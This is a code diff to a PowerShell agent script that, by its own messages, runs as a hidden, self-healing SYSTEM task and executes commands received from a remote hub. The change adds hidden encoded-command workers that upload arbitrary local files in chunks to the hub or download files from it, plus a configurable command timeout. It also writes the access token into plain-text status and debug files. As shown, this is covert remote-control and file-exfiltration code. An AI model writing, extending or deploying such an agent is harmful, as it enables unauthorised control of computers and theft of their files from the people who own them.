@@ -88,6 +88,91 @@ if ($Install) {
             Write-Output '!! OpenSSH extraction timed out'
         }
     }
+    # ---- 文件传输 worker：大输出/文件经 hub 中转存储（分块+重试+状态文件）----
+    New-Item -ItemType Directory -Force -Path (Join-Path $dataDir 'spool') | Out-Null
+$xfer = @'
+param([string]$Mode, [string]$Hub, [string]$Aid, [string]$Token, [string]$Name, [string]$Path, [string]$DataDir)
+$ErrorActionPreference = 'Stop'
+$StatusF = Join-Path $DataDir ('xfer-' + $Name + '.txt')
+[IO.File]::WriteAllText($StatusF, ('params: Hub=[' + $Hub + '] Aid=[' + $Aid + '] Token=[' + $Token + '] Name=[' + $Name + '] Path=[' + $Path + '] DataDir=[' + $DataDir + ']'), [Text.Encoding]::ASCII)
+$fs = $null
+try {
+    if ($Mode -eq 'up') {
+        $fs = [IO.File]::OpenRead($Path)
+        $seq = 1
+        while ($true) {
+            $buf = New-Object byte[] 262144
+            $n = $fs.Read($buf, 0, 262144)
+            if ($n -le 0) { break }
+            $slice = New-Object byte[] $n
+            [Array]::Copy($buf, 0, $slice, 0, $n)
+            $posted = $false
+            for ($att = 1; $att -le 3 -and -not $posted; $att++) {
+                try {
+                    $u1 = $Hub + '/filechunk?id=' + $Aid + '&token=' + $Token + '&name=' + $Name + '&seq=' + $seq
+                    [IO.File]::AppendAllText($StatusF, [Environment]::NewLine + 'POST ' + $u1, [Text.Encoding]::ASCII)
+                    $req = [System.Net.HttpWebRequest]::Create($u1)
+                    $req.Method = 'POST'
+                    $req.ContentType = 'application/octet-stream'
+                    $req.Timeout = 180000
+                    $req.ContentLength = $n
+                    $rs = $req.GetRequestStream()
+                    $rs.Write($slice, 0, $n)
+                    $rs.Close()
+                    $req.GetResponse().Close()
+                    $posted = $true
+                } catch {
+                    if ($att -ge 3) { throw ('POST ' + $req.RequestUri + ' : ' + $_.Exception.Message) }
+                    Start-Sleep -Seconds (5 * $att)
+                }
+            }
+            $seq = $seq + 1
+        }
+        $fs.Close()
+        $req = [System.Net.HttpWebRequest]::Create($Hub + '/filedone?id=' + $Aid + '&token=' + $Token + '&name=' + $Name + '&chunks=' + ($seq - 1))
+        $req.Method = 'POST'
+        $req.ContentType = 'application/json'
+        $req.ContentLength = 2
+        $rs = $req.GetRequestStream()
+        $rs.Write([Text.Encoding]::ASCII.GetBytes('{}'), 0, 2)
+        $rs.Close()
+        $req.GetResponse().Close()
+        [IO.File]::WriteAllText($StatusF, 'ok', [Text.Encoding]::ASCII)
+    } else {
+        $fs = [IO.File]::Create($Path)
+        $seq = 1
+        while ($true) {
+            $u2 = $Hub + '/filechunk?id=' + $Aid + '&token=' + $Token + '&name=' + $Name + '&seq=' + $seq
+            [IO.File]::AppendAllText($StatusF, [Environment]::NewLine + 'GET ' + $u2, [Text.Encoding]::ASCII)
+            $req = [System.Net.HttpWebRequest]::Create($u2)
+            $req.Method = 'GET'
+            $req.Timeout = 180000
+            try {
+                $resp = $req.GetResponse()
+            } catch {
+                $code = 0
+                if ($_.Exception -and $_.Exception.Response) { try { $code = [int]$_.Exception.Response.StatusCode } catch { } }
+                if ($code -eq 404) { break }
+                throw ('GET ' + $req.RequestUri + ' : ' + $_.Exception.Message)
+            }
+            $rs = $resp.GetResponseStream()
+            $buf = New-Object byte[] 262144
+            while (($n = $rs.Read($buf, 0, 262144)) -gt 0) { $fs.Write($buf, 0, $n) }
+            $rs.Close()
+            $resp.Close()
+            $seq = $seq + 1
+        }
+        $fs.Close()
+        [IO.File]::WriteAllText($StatusF, 'ok', [Text.Encoding]::ASCII)
+    }
+} catch {
+    if ($fs) { try { $fs.Close() } catch { } }
+    [IO.File]::AppendAllText($StatusF, [Environment]::NewLine + 'error: ' + $_.Exception.Message, [Text.Encoding]::ASCII)
+}
+'@
+$xfer = $xfer.Replace('__HUB__', $hub).Replace('__AID__', $aid).Replace('__TOKEN__', $token).Replace('__DATADIR__', $dataDir)
+[IO.File]::WriteAllText((Join-Path $dataDir 'filexfer.ps1'), $xfer, (New-Object Text.UTF8Encoding $false))
+Write-Output 'file transfer worker ready'
     Write-Output 'agent installed (SYSTEM task, hidden, self-heals)'
     return
 }
@@ -151,6 +236,8 @@ $mutex = New-Object System.Threading.Mutex -ArgumentList @($false, $mutexName)
 $got = $false
 try { $got = $mutex.WaitOne(0) } catch { $got = $true }  # abandoned mutex = previous instance died
 if (-not $got) { return }
+$spool = Join-Path $dataDir 'spool'
+if (-not (Test-Path $spool)) { New-Item -ItemType Directory -Force -Path $spool | Out-Null }
 $pubkey = ''
 $keyPub = Join-Path (Join-Path $dataDir 'keys') 'id_ed25519.pub'
 if (Test-Path $keyPub) { $pubkey = [IO.File]::ReadAllText($keyPub).Trim() }
@@ -163,13 +250,30 @@ while ($true) {
         $c = ''
         try { $c = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64)) } catch { }
         if ($c) {
-            # relay requests ride the same pipe; one worker per request, exec for the rest
-            $relayLines = @($c -split "`r?`n" | Where-Object { $_ -match '^__relay ' })
-            $execText = ((($c -split "`r?`n") | Where-Object { $_ -notmatch '^__relay ' }) -join "`n").Trim()
-            foreach ($rl in $relayLines) {
-                $pp = @($rl -split ' ')
-                if ($pp.Count -ge 4) {
-                    Start-Process powershell -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $selfPath, '-Relay', $pp[1], $pp[2], $pp[3]) -WindowStyle Hidden
+            # 内部指令行（__relay/__fileup/__filedn/__timeout）不进 cmd，其余为 exec 命令
+            $metaLines = @($c -split "`r?`n" | Where-Object { $_ -match '^__' })
+            $execText = ((($c -split "`r?`n") | Where-Object { $_ -notmatch '^__' }) -join "`n").Trim()
+            $maxWait = 120000
+            foreach ($ml in $metaLines) {
+                if ($ml -match '^__relay ') {
+                    $pp = @($ml -split ' ')
+                    if ($pp.Count -ge 4) {
+                        Start-Process powershell -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $selfPath, '-Relay', $pp[1], $pp[2], $pp[3]) -WindowStyle Hidden
+                    }
+                } elseif ($ml -match '^__(fileup|filedn) ') {
+                    $sp = @($ml -split ' ', 3)
+                    if ($sp.Count -ge 3) {
+                        $xmode = $sp[0].Substring(2)
+                        $xname = $sp[1]
+                        $xpath = $sp[2]
+                        $wcmd = '& "' + (Join-Path $dataDir 'filexfer.ps1') + '" -Hub ' + $hub + ' -Aid ' + $aid + ' -Token ' + $token + ' -Mode ' + $xmode + ' -Name ' + $xname + ' -Path "' + $xpath + '" -DataDir "' + $dataDir + '"'
+                        $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($wcmd))
+                        [IO.File]::WriteAllText((Join-Path $dataDir 'spawn-dbg.txt'), ('WCMD: ' + $wcmd + [Environment]::NewLine + 'ENC: ' + $enc), [Text.Encoding]::Unicode)
+                        Start-Process powershell -ArgumentList @('-NoProfile', '-EncodedCommand', $enc) -WindowStyle Hidden
+                    }
+                } elseif ($ml -match '^__timeout ') {
+                    $tp = @($ml -split ' ')
+                    if ($tp.Count -ge 2 -and $tp[1] -match '^\d+$') { $maxWait = [int]$tp[1] * 1000 }
                 }
             }
             $c = $execText
@@ -190,14 +294,14 @@ while ($true) {
             # doubled outer quotes: cmd /c strips first+last, leaving every inner quote intact
             $p = Start-Process cmd.exe -ArgumentList ('/c ""' + $cmdF + '" > "' + $outF + '" 2> "' + $errF + '""') -WindowStyle Hidden -PassThru
             $waited = 0
-            while ($p.HasExited -eq $false -and $waited -lt 120000) { Start-Sleep -Milliseconds 500; $waited = $waited + 500 }
+            while ($p.HasExited -eq $false -and $waited -lt $maxWait) { Start-Sleep -Milliseconds 500; $waited = $waited + 500 }
             $code = 124
             $so = ''
             $se = ''
             if ($p.HasExited -eq $false) {
                 # 硬超时：卡死的命令杀进程树，绝不冻死 agent
                 Start-Process taskkill.exe -ArgumentList @('/F', '/T', '/PID', [string]$p.Id) -WindowStyle Hidden
-                $se = 'exec timeout (120s), process tree killed'
+                $se = ('exec timeout (' + [int]($maxWait / 1000) + 's), process tree killed')
             } else {
                 # PS2.0 下非 -Wait 进程的 ExitCode 取不到（null 会产生非法 JSON 被 hub 静默拒收）——退出码从独立标记文件解析
                 if (Test-Path $outF) { $so = [IO.File]::ReadAllText($outF, [Text.Encoding]::Default) }
